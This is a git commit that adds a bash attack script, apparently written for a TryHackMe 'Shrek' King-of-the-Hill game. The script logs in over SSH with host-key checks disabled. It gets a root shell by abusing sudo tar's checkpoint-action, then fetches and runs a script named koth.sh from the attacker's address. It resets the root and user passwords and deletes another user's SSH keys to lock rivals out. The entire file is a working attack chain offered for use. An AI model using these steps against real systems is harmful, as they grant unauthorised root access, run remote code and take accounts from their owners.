3486479e5c325d134de2cb98a3894152c6cd0acb
H3X-007 <123769326+H3X-007@users.noreply.github.com>
2023-07-01 13:45:12 +0100

    Add files via upload

---
+++ Shrek/Shrek.sh
@@ -0,0 +1,21 @@
+#!/bin/bash
+set -x
+
+
+read -p "Your TryHackMe username: " nick
+read -p "Enter SSH IP address: " ip_address
+read -s -p "Enter the new password: " password
+
+vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
+
+ssh -o StrictHostKeychecking=no donkey@"$ip_address" << EOF
+
+    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+    sleep 2
+
+    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$nick"
+    echo "$password" | passwd --stdin root
+    echo "$password" | passwd --stdin donkey
+    echo "$password" | passwd --stdin shrek
+    rm -rf /home/shrek/.ssh
+EOF
